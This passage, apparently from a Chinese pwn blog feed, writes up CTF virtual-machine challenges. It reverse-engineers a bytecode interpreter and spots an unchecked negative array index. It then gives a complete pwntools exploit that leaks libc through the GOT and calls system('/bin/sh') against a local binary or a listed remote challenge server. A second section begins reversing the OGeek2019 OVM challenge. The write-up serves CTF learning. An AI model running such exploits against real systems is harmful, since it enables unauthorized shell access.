class="comment">// array_header = 0x4060</span></span><br><span class="line">  <span class="built_in">free</span>(heap);</span><br><span class="line">  <span class="built_in">free</span>(sp_);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>heap，sp_，bp，reg，execute 都是经过重命名后的（一些命名可能不太准确）</p>
<p>重点：这个vmpwn让输入的是字节流，如<code>b&#39;\x01&#39;</code>，<code>b&#39;\x01\xf5\x01&#39;</code>这个也就是opcode代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">|	op	  |  	src		|	dest	|</span><br><span class="line">|	\x01  |    \xf5		|	\x01	|</span><br></pre></td></tr></table></figure>

<p>看一下bss段内存：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.bss:0000000000004040 ; FILE *stderr</span><br><span class="line">.bss:0000000000004040 stderr          dq ?                    ; DATA XREF: LOAD:0000000000000588↑o</span><br><span class="line">.bss:0000000000004040                                         ; push+4C↑r ...</span><br><span class="line">.bss:0000000000004040                                         ; Copy of shared data</span><br><span class="line">.bss:0000000000004048 byte_4048       db ?                    ; DATA XREF: sub_1220+4↑r</span><br><span class="line">.bss:0000000000004048                                         ; sub_1220+2C↑w</span><br><span class="line">.bss:0000000000004049                 align 20h</span><br><span class="line">.bss:0000000000004060 ; _QWORD reg[5]</span><br><span class="line">.bss:0000000000004060 reg             dq 5 dup(?)             ; DATA XREF: main+DB↑o</span><br><span class="line">.bss:0000000000004088 bp_             dq ?                    ; DATA XREF: main+A4↑w</span><br><span class="line">.bss:0000000000004090 ; void *heap</span><br><span class="line">.bss:0000000000004090 heap            dq ?                    ; DATA XREF: main+7F↑w</span><br><span class="line">.bss:0000000000004090                                         ; main+BC↑r ...</span><br><span class="line">.bss:0000000000004098 ax_             <span class="built_in">dd</span> ?                    ; DATA XREF: main+D5↑w</span><br><span class="line">.bss:000000000000409C                 align 20h</span><br><span class="line">.bss:00000000000040A0 ; void *sp_</span><br><span class="line">.bss:00000000000040A0 sp_             dq ?                    ; DATA XREF: main+90↑w</span><br><span class="line">.bss:00000000000040A0                                         ; main+97↑r ...</span><br><span class="line">.bss:00000000000040A0 _bss            ends</span><br><span class="line">.bss:00000000000040A0</span><br></pre></td></tr></table></figure>

<p>这个heap模拟的是内存，应该是栈内存</p>
<h3 id="fetch-opcode"><a href="#fetch-opcode" class="headerlink" title="fetch_opcode()"></a>fetch_opcode()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">fetch_opcode</span><span class="params">(__int64 reg)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rsi</span></span><br><span class="line">  __int64 pc; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = *(reg + <span class="number">0x30</span>);                           <span class="comment">// reg+0x30 = 0x4090--&gt;heap</span></span><br><span class="line">  pc = *(reg + <span class="number">0x20</span>);                           <span class="comment">// pc</span></span><br><span class="line">  *(reg + <span class="number">0x20</span>) = pc + <span class="number">1</span>;                       <span class="comment">// pc++</span></span><br><span class="line">  <span class="keyword">return</span> *(v1 + pc);                            <span class="comment">// heap[pc]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数的作用就是一次取一字节的opcode</p>
<h3 id="fetch-next-qword"><a href="#fetch-next-qword" class="headerlink" title="fetch_next_qword()"></a>fetch_next_qword()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_132C</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = *(*(a1 + <span class="number">0x30</span>) + *(a1 + <span class="number">0x20</span>));			<span class="comment">// heap[pc]</span></span><br><span class="line">  *(a1 + <span class="number">0x20</span>) += <span class="number">8LL</span>;                          <span class="comment">// pc = pc+8</span></span><br><span class="line">  <span class="keyword">return</span> v2;                                    <span class="comment">// heap[pc]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>读取一个8字节数据，在程序中</p>
<h3 id="push"><a href="#push" class="headerlink" title="push()"></a>push()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_1393</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  *(a1 + <span class="number">40</span>) -= <span class="number">8LL</span>;                            <span class="comment">// sp = sp-8</span></span><br><span class="line">  <span class="keyword">if</span> ( *(a1 + <span class="number">40</span>) &lt; *(a1 + <span class="number">64</span>) )                <span class="comment">// sp &lt; bp</span></span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;Stack underflow!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x11u</span>LL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  **(a1 + <span class="number">40</span>) = a2;                             <span class="comment">// *sp = a2</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数中首先栈顶指针<code>sp -= 8</code>就说明了它是入栈操作，还将a2赋给了sp指向的地址</p>
<h3 id="pop"><a href="#pop" class="headerlink" title="pop()"></a>pop()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">pop</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(a1 + <span class="number">40</span>) &gt;= (*(a1 + <span class="number">64</span>) + <span class="number">0x8000L</span>L) )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;Stack overflow!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x10u</span>LL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = **(a1 + <span class="number">40</span>);</span><br><span class="line">  *(a1 + <span class="number">40</span>) += <span class="number">8LL</span>;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与上面push()相反就是出战喽</p>
<h3 id="execute"><a href="#execute" class="headerlink" title="execute()"></a>execute()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v15 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  opcode = fetch_opcode(reg);                 <span class="comment">// 从内存中取出opcode的第一个op，op1</span></span><br><span class="line">  <span class="keyword">switch</span> ( opcode )</span><br><span class="line">  &#123;                                           <span class="comment">// mov 数组溢出</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">      v13 = fetch_opcode(reg);</span><br><span class="line">      reg[v13] = fetch_next_qword(reg);       <span class="comment">// mov reg,num</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:                                  </span><br><span class="line">      v12 = fetch_opcode(reg);				<span class="comment">//取出opcode中第二个op,op2</span></span><br><span class="line">      reg[fetch_opcode(reg)] = *reg[v12];		<span class="comment">//reg[op3] = *op2将op2指向的内存赋值给reg[op3]</span></span><br><span class="line">      <span class="keyword">break</span>;									<span class="comment">//推断：mov reg,[mem]</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">      v11 = fetch_opcode(reg);                </span><br><span class="line">      *reg[fetch_opcode(reg)] = reg[v11];		<span class="comment">//*reg[op3] = reg[op2]</span></span><br><span class="line">      <span class="keyword">break</span>;									<span class="comment">//mov [mem],reg</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">3u</span>:                                  </span><br><span class="line">      v10 = fetch_opcode(reg);				</span><br><span class="line">      reg[fetch_opcode(reg)] = reg[v10];		<span class="comment">//reg[op3] = reg[op2]</span></span><br><span class="line">      <span class="keyword">break</span>;									<span class="comment">//mov reg,reg</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">      v1 = reg[<span class="number">6</span>];							<span class="comment">// reg[6]=heap_ptr</span></span><br><span class="line">      v2 = reg[<span class="number">4</span>];							<span class="comment">// pc</span></span><br><span class="line">      reg[<span class="number">4</span>] = v2 + <span class="number">1</span>;                        <span class="comment">// pc++</span></span><br><span class="line">      push(reg, reg[*(v1 + v2)]);             <span class="comment">// push reg[heap_ptr+pc] ---&gt; push</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">      v3 = reg[<span class="number">6</span>];</span><br><span class="line">      v4 = reg[<span class="number">4</span>];</span><br><span class="line">      reg[<span class="number">4</span>] = v4 + <span class="number">1</span>;                        <span class="comment">// pc++</span></span><br><span class="line">      v5 = *(v3 + v4);</span><br><span class="line">      reg[v5] = pop(reg);                     <span class="comment">// pop reg[heap_ptr+pc] ---&gt; pop</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">      v14 = reg[fetch_opcode(reg)];			<span class="comment">// 这里取得是opcode的第三个字节op3</span></span><br><span class="line">      v14(*reg);                              <span class="comment">// call---&gt;op3(reg[0])函数调用</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">      reg[<span class="number">4</span>] = pop(reg);                      <span class="comment">// pop pc ---&gt; ret</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8u</span>:                                  <span class="comment">// exit</span></span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v15;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">9u</span>:                                  <span class="comment">// nop</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xAu</span>:                                <span class="comment">// add</span></span><br><span class="line">      v9 = fetch_opcode(reg);					<span class="comment">// op2	</span></span><br><span class="line">      reg[v9] += fetch_next_qword(reg);		<span class="comment">// reg[op2] = reg[op2] + num</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xBu</span>:                                <span class="comment">// sub</span></span><br><span class="line">      v8 = fetch_opcode(reg);</span><br><span class="line">      reg[v8] -= fetch_next_qword(reg);		<span class="comment">// reg[op2] = reg[op2] - num</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Invalid opcode: 0x%02x\n&quot;</span>, opcode);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>因此推出指令集：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">\x00: mov reg[op2],num ---&gt; heap_ptr+pc</span></span><br><span class="line"><span class="string">\x01: mov reg[op3],[mem]---&gt;*reg[op2]</span></span><br><span class="line"><span class="string">\x02: mov [mem]---&gt;*reg[op3],reg[op2]</span></span><br><span class="line"><span class="string">\x03: mov reg[op3],reg[op2]</span></span><br><span class="line"><span class="string">\x04: push</span></span><br><span class="line"><span class="string">\x05: pop</span></span><br><span class="line"><span class="string">\x06: call---&gt;op3(reg[0])函数调用</span></span><br><span class="line"><span class="string">\x07: ret ---&gt; pop ip</span></span><br><span class="line"><span class="string">\x08: exit</span></span><br><span class="line"><span class="string">\x09: nop</span></span><br><span class="line"><span class="string">\x0a: add reg[op2],num</span></span><br><span class="line"><span class="string">\x0b: sub reg[op2],num</span></span><br><span class="line"><span class="string">op2均为src，op3均为dst</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>漏洞点与其他的vm题类似，这个数组是一个有符号的数组(通过下面<code>movzx</code>看出)，在\x01和\x02是有<strong>数组溢出</strong>的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000017B1 def_152F:                               ; CODE XREF: execute+36↑j</span><br><span class="line">.text:00000000000017B1                 movzx   edx, [rbp+opcode] ; jumptable 000000000000152F default case</span><br><span class="line">.text:00000000000017B5                 mov     rax, cs:stderr</span><br><span class="line">.text:00000000000017BC                 lea     rsi, format     ; &quot;Invalid opcode: 0x%02x\n&quot;</span><br><span class="line">.text:00000000000017C3                 mov     rdi, rax        ; stream</span><br><span class="line">.text:00000000000017C6                 mov     eax, 0</span><br><span class="line">.text:00000000000017CB                 call    _fprintf</span><br><span class="line">.text:00000000000017D0                 mov     edi, 1          ; status</span><br><span class="line">.text:00000000000017D5                 call    _exit</span><br></pre></td></tr></table></figure>

<p>而且我们可以发现程序对数组的下标是没有任何检查的，因此我们可以通过<strong>负数</strong>的下标来读取got表内容，我们可以操作的内存有reg[0]~reg[3]</p>
<p>思路：</p>
<ul>
<li>通过数组溢出读取got表的地址，因为got表不可写，所以我们通过got附近的地址-offest直接计算出malloc的got地址</li>
<li>用可操纵的内存计算libc_base并分别将<code>/bin/sh\x00</code>放入reg[0]，<code>system</code>放入reg[2]</li>
<li>直接通过call调用即可getshell</li>
</ul>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-02 17:17:51</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&quot;101.200.155.151&quot;</span>, <span class="number">20000</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p,gdbscript)</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	b *$rebase(0x14F3)\nb *$rebase(0x15ac)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">\x00: mov reg[op2],num ---&gt; heap_ptr+pc</span></span><br><span class="line"><span class="string">\x01: mov reg[op3],[mem]---&gt;*reg[op2]</span></span><br><span class="line"><span class="string">\x02: mov [mem]---&gt;*reg[op3],reg[op2]</span></span><br><span class="line"><span class="string">\x03: mov reg[op3],reg[op2]</span></span><br><span class="line"><span class="string">\x04: push</span></span><br><span class="line"><span class="string">\x05: pop</span></span><br><span class="line"><span class="string">\x06: call---&gt;op3(reg[0])函数调用</span></span><br><span class="line"><span class="string">\x07: ret ---&gt; pop ip</span></span><br><span class="line"><span class="string">\x08: exit</span></span><br><span class="line"><span class="string">\x09: nop</span></span><br><span class="line"><span class="string">\x0a: add reg[op2],num</span></span><br><span class="line"><span class="string">\x0b: sub reg[op2],num</span></span><br><span class="line"><span class="string">op2均为src，op3均为dst</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># \x00</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_num</span>(<span class="params">reg, num</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbQ&quot;</span>, <span class="number">0</span>, reg, num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x01</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_indirect</span>(<span class="params">src_reg, dst_reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbb&quot;</span>, <span class="number">1</span>, src_reg, dst_reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x02</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store_indirect</span>(<span class="params">src_reg, dst_reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbb&quot;</span>, <span class="number">2</span>, src_reg, dst_reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x03</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov_reg</span>(<span class="params">src_reg, dst_reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbb&quot;</span>, <span class="number">3</span>, src_reg, dst_reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x04: push</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bB&quot;</span>, <span class="number">4</span>, reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x05: pop</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bB&quot;</span>, <span class="number">5</span>, reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x06: call</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_call</span>(<span class="params">reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bB&quot;</span>, <span class="number">6</span>, reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x08: exit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_vm</span>():</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;b&quot;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x0a: add</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_num</span>(<span class="params">reg, num</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbQ&quot;</span>, <span class="number">0xA</span>, reg, num)<span class="comment">#num要用做地址计算，用8字节类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \x0b: sub</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_num</span>(<span class="params">reg, num</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbQ&quot;</span>, <span class="number">0xB</span>, reg, num)</span><br><span class="line"></span><br><span class="line"><span class="comment">#先获得data段0x4008的地址此处指向是base+0x4008，可以间接计算got</span></span><br><span class="line">payload = load_indirect(-<span class="number">11</span>, <span class="number">1</span>) + sub_num(<span class="number">1</span>, <span class="number">0x50</span>) + load_indirect(<span class="number">1</span>, <span class="number">0</span>) + sub_num(<span class="number">0</span>, libc.sym[<span class="string">&quot;malloc&quot;</span>]) + mov_reg(<span class="number">0</span>, <span class="number">2</span>) </span><br><span class="line">payload += add_num(<span class="number">2</span>, libc.sym[<span class="string">&quot;system&quot;</span>]) + add_num(<span class="number">0</span>, <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh\x00&quot;</span>))) + func_call(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#payload += exit_vm()</span></span><br><span class="line"><span class="comment">#debug(&quot;b *$rebase(0x14F3)\nb *$rebase(0x15ac)&quot;)</span></span><br><span class="line">sla(<span class="string">&quot;bytecode: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>



<h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><p>在buuctf中有该题目</p>
<h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><h4 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int16 v4; <span class="comment">// [rsp+2h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 pc; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 sp_; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  comment = <span class="built_in">malloc</span>(<span class="number">0x8Cu</span>LL);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  signal(<span class="number">2</span>, signal_handler);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WELCOME TO OVM PWN\n&quot;</span>, <span class="number">0x16u</span>LL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;PC: &quot;</span>, <span class="number">4uLL</span>);                       <span class="comment">// 输入pc寄存器值</span></span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;pc);                    <span class="comment">// %hd 主要用于 short int 类型的输入输出,16位</span></span><br><span class="line">  getchar();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;SP: &quot;</span>, <span class="number">4uLL</span>);                       <span class="comment">// 输入sp寄存器值</span></span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;sp_);</span><br><span class="line">  getchar();</span><br><span class="line">  reg[<span class="number">13</span>] = sp_;                                <span class="comment">// 把sp和pc分别存到寄存器数组的13号和15号位置</span></span><br><span class="line">  reg[<span class="number">15</span>] = pc;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;CODE SIZE: &quot;</span>, <span class="number">0xBu</span>LL);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;v4);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( sp_ + (<span class="type">unsigned</span> <span class="type">int</span>)v4 &gt; <span class="number">0x10000</span> || !v4 )</span><br><span class="line">  &#123;                				  <span class="comment">// 检查sp+code_size不能超过0x10000（64K），且code_size不能为0，否则异常退出。</span></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;EXCEPTION\n&quot;</span>, <span class="number">0xAu</span>LL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">155</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;CODE: &quot;</span>, <span class="number">6uLL</span>);</span><br><span class="line">  running = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v4 &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;memory[pc + i]);       <span class="comment">//memory---&gt;opcode</span></span><br><span class="line">    <span class="keyword">if</span> ( (memory[i + pc] &amp; <span class="number">0xFF000000</span>) == <span class="number">0xFF000000</span> )</span><br><span class="line">      memory[i + pc] = <span class="number">0xE0000000</span>;              <span class="comment">// 如果指令高8位为0xFF（即0xFFxxxxxx），则强制改为0xE0000000</span></span><br><span class="line">    getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( running )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = fetch();</span><br><span class="line">    execute(v7);</span><br><span class="line">  &#125;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>, <span class="number">0x1Bu</span>LL);</span><br><span class="line">  read(<span class="number">0</span>, comment, <span class="number">0x8Cu</span>LL);</span><br><span class="line">  sendcomment(comment);                         <span class="comment">// free()</span></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Bye\n&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fetch"><a href="#fetch" class="headerlink" title="fetch()"></a>fetch()</h3><p>返回当前指令之后，跳转到下一条指令。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">fetch</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = reg[<span class="number">15</span>];</span><br><span class="line">  reg[<span class="number">15</span>] = v0 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)memory[v0];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>作用：</p>
<ul>
<li><p>取出当前PC（reg[15]）指向的指令（memory[v0]），然后PC自增1。</p>
</li>
<li><p>返回该指令。</p>
</li>
</ul>
<h3 id="execute-1"><a href="#execute-1" class="headerlink" title="execute()"></a>execute()</h3><p>执行函数的逆向才是VMPWN的核心。</p>
<p>我们先了解几个宏函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LOWORD(l)           ((WORD)(((DWORD_PTR)(l)) &amp; 0xffff))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIWORD(l)           ((WORD)((((DWORD_PTR)(l)) &gt;&gt; 16) &amp; 0xffff))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOBYTE(w)           ((BYTE)(((DWORD_PTR)(w)) &amp; 0xff))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIBYTE(w)           ((BYTE)((((DWORD_PTR)(w)) &gt;&gt; 8) &amp; 0xff))</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>vmpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>固件模拟</title>
